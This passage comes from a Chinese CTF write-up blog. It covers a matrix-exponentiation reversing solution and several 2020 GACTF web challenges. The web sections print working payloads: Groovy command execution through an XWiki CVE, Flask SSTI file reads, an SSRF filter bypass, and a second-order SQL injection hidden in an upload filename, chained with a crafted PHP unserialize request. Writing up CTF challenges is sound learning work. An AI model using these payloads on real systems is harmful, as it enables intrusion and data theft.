<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">76</span>-<span class="number">27</span>-<span class="number">139</span>-<span class="number">76</span>-<span class="number">72</span>-<span class="number">104</span>-<span class="number">141</span>-<span class="number">81</span>-<span class="number">217</span>&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们就可以猜测其实它们就是进行了这样一个运算</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$v4</span>[<span class="number">0</span>] = <span class="variable">$v2</span>[<span class="number">0</span>] * <span class="variable">$v3</span>[<span class="number">0</span>] + <span class="variable">$v2</span>[<span class="number">1</span>] * <span class="variable">$v3</span>[<span class="number">3</span>] + <span class="variable">$v2</span>[<span class="number">2</span>] * <span class="variable">$v3</span>[<span class="number">6</span>];</span><br></pre></td></tr></table></figure>

<p>根据这个规律我们可以得到初步的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line">	<span class="keyword">global</span> v1, v2, x</span><br><span class="line"></span><br><span class="line">	v3 = v1[(<span class="number">3</span> ** x) % <span class="number">7</span>]</span><br><span class="line">	v4 = [<span class="number">0</span>] * <span class="number">9</span></span><br><span class="line"></span><br><span class="line">	v4[<span class="number">0</span>] = (v2[<span class="number">0</span>]*v3[<span class="number">0</span>] + v2[<span class="number">1</span>]*v3[<span class="number">3</span>] + v2[<span class="number">2</span>]*v3[<span class="number">6</span>]) % <span class="number">1000000007</span></span><br><span class="line">	v4[<span class="number">1</span>] = (v2[<span class="number">0</span>]*v3[<span class="number">1</span>] + v2[<span class="number">1</span>]*v3[<span class="number">4</span>] + v2[<span class="number">2</span>]*v3[<span class="number">7</span>]) % <span class="number">1000000007</span></span><br><span class="line">	v4[<span class="number">2</span>] = (v2[<span class="number">0</span>]*v3[<span class="number">2</span>] + v2[<span class="number">1</span>]*v3[<span class="number">5</span>] + v2[<span class="number">2</span>]*v3[<span class="number">8</span>]) % <span class="number">1000000007</span></span><br><span class="line"></span><br><span class="line">	v4[<span class="number">3</span>] = (v2[<span class="number">3</span>]*v3[<span class="number">0</span>] + v2[<span class="number">4</span>]*v3[<span class="number">3</span>] + v2[<span class="number">5</span>]*v3[<span class="number">6</span>]) % <span class="number">1000000007</span></span><br><span class="line">	v4[<span class="number">4</span>] = (v2[<span class="number">3</span>]*v3[<span class="number">1</span>] + v2[<span class="number">4</span>]*v3[<span class="number">4</span>] + v2[<span class="number">5</span>]*v3[<span class="number">7</span>]) % <span class="number">1000000007</span></span><br><span class="line">	v4[<span class="number">5</span>] = (v2[<span class="number">3</span>]*v3[<span class="number">2</span>] + v2[<span class="number">4</span>]*v3[<span class="number">5</span>] + v2[<span class="number">5</span>]*v3[<span class="number">8</span>]) % <span class="number">1000000007</span></span><br><span class="line"></span><br><span class="line">	v4[<span class="number">6</span>] = (v2[<span class="number">6</span>]*v3[<span class="number">0</span>] + v2[<span class="number">7</span>]*v3[<span class="number">3</span>] + v2[<span class="number">8</span>]*v3[<span class="number">6</span>]) % <span class="number">1000000007</span></span><br><span class="line">	v4[<span class="number">7</span>] = (v2[<span class="number">6</span>]*v3[<span class="number">1</span>] + v2[<span class="number">7</span>]*v3[<span class="number">4</span>] + v2[<span class="number">8</span>]*v3[<span class="number">7</span>]) % <span class="number">1000000007</span></span><br><span class="line">	v4[<span class="number">8</span>] = (v2[<span class="number">6</span>]*v3[<span class="number">2</span>] + v2[<span class="number">7</span>]*v3[<span class="number">5</span>] + v2[<span class="number">8</span>]*v3[<span class="number">8</span>]) % <span class="number">1000000007</span></span><br><span class="line">	</span><br><span class="line">	v2 = v4</span><br><span class="line">	x += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">	v1 = [</span><br><span class="line">		[<span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>],</span><br><span class="line">		[<span class="number">8</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>], </span><br><span class="line">		[<span class="number">9</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>], </span><br><span class="line">		[<span class="number">9</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>], </span><br><span class="line">		[<span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>], </span><br><span class="line">		[<span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">2</span>], </span><br><span class="line">		[<span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">0</span>], </span><br><span class="line">		[<span class="number">8</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">2</span>]</span><br><span class="line">	]</span><br><span class="line">	v2 = v1[<span class="number">0</span>]</span><br><span class="line">	x = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">	count = (<span class="number">6755399441055744</span> - <span class="number">998244353</span>) // <span class="number">2</span></span><br><span class="line">	count = <span class="number">2</span></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">		calc()</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&quot;-&quot;</span>.join([<span class="built_in">str</span>(_ % <span class="number">1000000007</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> v2]) + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a>矩阵快速幂</h3><p>想要上面的脚本暴力解出来不可能的，因为需要3377699221405695次运算</p>
<p>仔细观察，其实这刚好是一个3组3*3矩阵连乘的运算，这里考察的是一个矩阵快速幂的算法</p>
<blockquote>
<p>推荐使用SageMath解题，SageMath整合了很多数学的常用算法</p>
</blockquote>
<p>参考**@ver**大哥exp给出自己的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/sage</span></span><br><span class="line"><span class="comment"># 变换矩阵</span></span><br><span class="line">v1 = [</span><br><span class="line">    [<span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>], </span><br><span class="line">    [<span class="number">9</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>], </span><br><span class="line">    [<span class="number">9</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">9</span>], </span><br><span class="line">    [<span class="number">5</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">8</span>], </span><br><span class="line">    [<span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">2</span>], </span><br><span class="line">    [<span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">0</span>], </span><br><span class="line">    [<span class="number">8</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">2</span>]</span><br><span class="line">]</span><br><span class="line"><span class="comment"># 初始矩阵</span></span><br><span class="line">v2 = v1[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 模数</span></span><br><span class="line">p = <span class="number">1000000007</span></span><br><span class="line"><span class="comment"># 循环次数</span></span><br><span class="line">count = (<span class="number">6755399441055744</span> - <span class="number">998244353</span>) // <span class="number">2</span></span><br><span class="line"><span class="comment"># 初始化3个初始矩阵</span></span><br><span class="line">vec = [Matrix(GF(p), <span class="number">1</span>, <span class="number">3</span>, v2[<span class="number">3</span> * i: <span class="number">3</span> * i + <span class="number">3</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"><span class="comment"># 获取6个循环矩阵</span></span><br><span class="line">ma = [Matrix(GF(p), <span class="number">3</span>, <span class="number">3</span>, v1[(<span class="number">3</span> ** k) % <span class="number">7</span>]) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)]</span><br><span class="line"><span class="comment"># 获取1次循环结果</span></span><br><span class="line">mm = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	mm *= ma[i]</span><br><span class="line"><span class="comment"># 打印乘法余数</span></span><br><span class="line"><span class="built_in">print</span>(count % <span class="number">6</span>)</span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 矩阵快速幂</span></span><br><span class="line">mm = (mm ** (count//<span class="number">6</span>)) * ma[<span class="number">0</span>] * ma[<span class="number">1</span>] * ma[<span class="number">2</span>] * ma[<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 乘上初始矩阵</span></span><br><span class="line">res = [(vec[i] * mm)[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line"><span class="comment"># 打印结果</span></span><br><span class="line">flag = [<span class="built_in">str</span>(res[i // <span class="number">3</span>][i % <span class="number">3</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&quot;-&quot;</span>.join(flag) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># flag&#123;432734187-186275980-552238391-407500134-680581127-536698178-262495339-821428559-850467550&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 GACTF web</title>
    <url>/2020/08/31/2020-GACTF-web/</url>
    <content><![CDATA[<p>题目很有意思，给星盟师傅跪了</p>
<span id="more"></span>

<h2 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h2><blockquote>
<p>XWiki CVE &amp; groovy 交互</p>
</blockquote>
<p>XWiki 11.10.1，搜索当前CVE，找到任意命令执行漏洞</p>
<p><a href="https://jira.xwiki.org/browse/XWIKI-16960">https://jira.xwiki.org/browse/XWIKI-16960</a></p>
<p>python被底层限制，但是groovy可以打 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">proc = r.exec(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">stdInput1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span> ((s1 = stdInput1.readLine()) != <span class="literal">null</span>) &#123; print s1; &#125;</span><br></pre></td></tr></table></figure>

<p>一开读flag的时候就会卡死，后来一句句读了发现需要交互回答问题，没给问题个数，回答哪个数最大，0或者1，一开始我以为回答完就会给flag，结果手打了几十个 : )发现还没到尽头，而且回答的顺序是固定，那估计就是flag的bin值，写个脚本然后手动二分到464位结束，最后是Congratulations，然后把回答的01连起来就是flag</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">proc = Runtime.getRuntime().exec(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(proc.getOutputStream()));</span><br><span class="line"><span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i in <span class="number">1.</span><span class="number">.2</span>) &#123;</span><br><span class="line"> s1 = br.readLine();</span><br><span class="line"> println s1; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i in <span class="number">1.</span><span class="number">.464</span>) &#123;</span><br><span class="line"> s1 = br.readLine();</span><br><span class="line"> res = s1[<span class="number">25.</span>.-<span class="number">1</span>].split(<span class="string">&#x27; : &#x27;</span>);</span><br><span class="line"> a = Integer.parseInt(res[<span class="number">0</span>]);</span><br><span class="line"> b = Integer.parseInt(res[<span class="number">1</span>]);</span><br><span class="line"> c = (a &gt; b) ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line"> flag += c</span><br><span class="line"> bw.write(c+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"> bw.flush();</span><br><span class="line">&#125;</span><br><span class="line">s1 = br.readLine();</span><br><span class="line">println s1</span><br><span class="line">println flag</span><br></pre></td></tr></table></figure>



<h2 id="simpleflask"><a href="#simpleflask" class="headerlink" title="simpleflask"></a>simpleflask</h2><blockquote>
<p>SSTI</p>
</blockquote>
<p>过滤单引号、空格、加号、flag、eval、import，限制了文件名长度</p>
<p>这里直接贴payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=&#123;&#123;&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/FLAG&quot;</span>.swapcase()).read()&#125;&#125;</span><br></pre></td></tr></table></figure>





<h2 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h2><blockquote>
<p>SSTI &amp; SSRF</p>
</blockquote>
<p>提出给出源码，有用的只有eval</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ctfhint&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ctf</span>():</span><br><span class="line">    hint =xxxx <span class="comment"># hints</span></span><br><span class="line">    trick = xxxx <span class="comment"># trick</span></span><br><span class="line">    <span class="keyword">return</span> trick</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># app.txt</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/eval&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_eval</span>():</span><br><span class="line">    <span class="comment"># post eval</span></span><br><span class="line"><span class="meta">@app.route(<span class="params">xxxxxx, methods=[<span class="string">&quot;POST&quot;</span>]</span>) </span><span class="comment"># Secret</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="comment"># admin requests</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>ban了很多单双引号和小中大括号，以及多个关键字，但是留下了<code>__globals__</code>和<code>func_globals</code>，利用它爆出admin路径</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /<span class="built_in">eval</span></span><br><span class="line"><span class="built_in">eval</span>=ctf.__globals__</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;my_eval&#x27;</span>: &lt;function my_eval at <span class="number">0x7f7469bf0dd0</span>&gt;, <span class="string">&#x27;app&#x27;</span>: &lt;Flask <span class="string">&#x27;app_1&#x27;</span>&gt;, <span class="string">&#x27;waf_eval&#x27;</span>: &lt;function waf_eval at <span class="number">0x7f7469bf0c50</span>&gt;, <span class="string">&#x27;admin&#x27;</span>: &lt;function admin at <span class="number">0x7f7469b3a650</span>&gt;, <span class="string">&#x27;index&#x27;</span>: &lt;function index at <span class="number">0x7f7469bf0d50</span>&gt;, <span class="string">&#x27;waf_ip&#x27;</span>: &lt;function waf_ip at <span class="number">0x7f7469bf0b50</span>&gt;, <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;, <span class="string">&#x27;admin_route&#x27;</span>: <span class="string">&#x27;/h4rdt0f1nd_9792uagcaca00qjaf&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;app_1.py&#x27;</span>, <span class="string">&#x27;request&#x27;</span>: &lt;Request <span class="string">&#x27;http://124.70.206.91:10001/eval&#x27;</span> [POST]&gt;, <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;Flask&#x27;</span>: &lt;<span class="keyword">class</span> <span class="string">&#x27;flask.app.Flask&#x27;</span>&gt;, <span class="string">&#x27;ctf&#x27;</span>: &lt;function ctf at <span class="number">0x7f7469bf0cd0</span>&gt;, <span class="string">&#x27;waf_path&#x27;</span>: &lt;function waf_path at <span class="number">0x7f7469bf0bd0</span>&gt;, <span class="string">&#x27;time&#x27;</span>: &lt;module <span class="string">&#x27;time&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/local/lib/python2.7/lib-dynload/time.so&#x27;</span>&gt;, <span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>, <span class="string">&#x27;requests&#x27;</span>: &lt;module <span class="string">&#x27;requests&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;/usr/local/lib/python2.7/site-packages/requests/__init__.pyc&#x27;</span>&gt;, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>&#125;</span><br></pre></td></tr></table></figure>

<p>admin是一个http请求，一看就是ssrf，fuzz了一下发现</p>
<ul>
<li>waf_ip满足点分十进制（准确来讲是点分数字）ban: xxx.0.0.xxx、192.xxx.xxx.xx</li>
<li>port是4位任意字符</li>
<li>path是非数字字符</li>
</ul>
<p>这里卡了很久，队友@小喇叭发现127开头的地址就可以绕过内网地址，这就有意思了 : )</p>
<p>扫到5000端口有东西，是常见的列出全局变量的SSTI</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /h4rdt0f1nd_9792uagcaca00qjaf</span><br><span class="line"></span><br><span class="line">ip=<span class="number">127.1</span><span class="number">.1</span><span class="number">.1</span>&amp;port=<span class="number">5000</span>&amp;path=</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">from</span> xxxx <span class="keyword">import</span> flag</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = flag</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;app.txt&#x27;</span>).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:hack&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">hack</span>):</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(hack)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>长度限制又过滤了<code>config</code>，这里可以直接把<code>[&#39;co&#39;+&#39;nfig&#39;]</code>写成<code>[&#39;co&#39;&#39;nfig&#39;]</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">POST /h4rdt0f1nd_9792uagcaca00qjaf</span><br><span class="line"></span><br><span class="line">ip=<span class="number">127.1</span><span class="number">.1</span><span class="number">.1</span>&amp;port=<span class="number">5000</span>&amp;path=%7B%7Burl_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>][<span class="string">&#x27;co&#x27;</span><span class="string">&#x27;nfig&#x27;</span>]%7D%7D</span><br></pre></td></tr></table></figure>



<h2 id="carefuleyes"><a href="#carefuleyes" class="headerlink" title="carefuleyes"></a>carefuleyes</h2><blockquote>
<p>二次注入 &amp; 反序列化</p>
</blockquote>
<p>题目给了源码，直接给了一个反序列化的接口</p>
<p>主要代码有</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$req</span>[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$info</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;oldfilename : &quot;</span>.<span class="variable">$info</span>[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot; will be changed.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这个存在二次注入，通过union注入可以得到username和password</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 0 union select username,password,1,1,1 from user#.jpg</span></span><br></pre></td></tr></table></figure>

<p>这里是反序列化的类，拿到admin就能拿到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$username</span>)));</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$password</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$obj</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span> &amp;&amp; <span class="variable">$obj</span>[<span class="string">&#x27;privilege&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>  ) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Admin only!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable language_">$this</span>, <span class="variable language_">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终exp如下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7Bs%3A14%3A%22%00XCTFGG%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00XCTFGG%00args%22%3Ba%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A2%3A%22XM%22%3Bs%3A8%3A%22password%22%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>124.71.191.175</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>343</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryVQBCUL5NvVhHTcjT</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryVQBCUL5NvVhHTcjT</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;upfile&quot;; filename=&quot;1&#x27; and 0 union select username,password,1,1,1 from user#.jpg&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/html</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span 